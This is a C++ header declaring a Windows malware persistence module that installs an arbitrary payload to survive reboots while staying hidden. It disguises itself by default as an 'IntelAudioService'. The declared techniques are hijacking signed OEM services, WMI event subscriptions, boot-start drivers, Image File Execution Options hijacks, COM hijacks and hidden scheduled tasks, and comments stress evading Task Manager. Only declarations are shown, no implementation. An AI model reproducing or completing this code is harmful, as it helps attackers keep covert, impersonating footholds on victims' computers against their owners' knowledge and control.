#pragma once
#include <windows.h>
#include <string>

namespace l4g::persistence {

struct BootStartResult {
    bool success = false;
    std::string method;
    std::string error;
};

class BootStart {
public:
    // Install invisible boot persistence
    static BootStartResult install(const std::wstring& payload_path, const std::wstring& service_name = L"IntelAudioService");
    
    // Uninstall
    static bool uninstall(const std::wstring& service_name = L"IntelAudioService");
    
    // Check if installed
    static bool is_installed(const std::wstring& service_name = L"IntelAudioService");
    
    // Persistence methods (invisible in Task Manager Startup)
    enum Method {
        METHOD_SERVICE_HIJACK = 0,    // Hijack signed OEM service
        METHOD_WMI_SUBSCRIPTION = 1,  // WMI event subscription
        METHOD_DRIVER_LOAD = 2,       // Boot-start driver
        METHOD_IMAGE_HIJACK = 3,      // Image File Execution Options
        METHOD_COM_HIJACK = 4,        // COM object hijack
        METHOD_SCHEDULED_TASK = 5     // Hidden scheduled task
    };
    
    static BootStartResult install_method(Method method, const std::wstring& payload_path, const std::wstring& name);
    
private:
    static bool create_service(const std::wstring& name, const std::wstring& payload, const std::wstring& display_name);
    static bool create_wmi_subscription(const std::wstring& name, const std::wstring& payload);
    static bool create_driver_service(const std::wstring& name, const std::wstring& driver_path);
    static bool create_image_hijack(const std::wstring& target, const std::wstring& payload);
    static bool create_com_hijack(const std::wstring& clsid, const std::wstring& payload);
    static bool create_hidden_task(const std::wstring& name, const std::wstring& payload);
    static std::wstring get_legitimate_display_name();
};

} // namespace l4g::persistence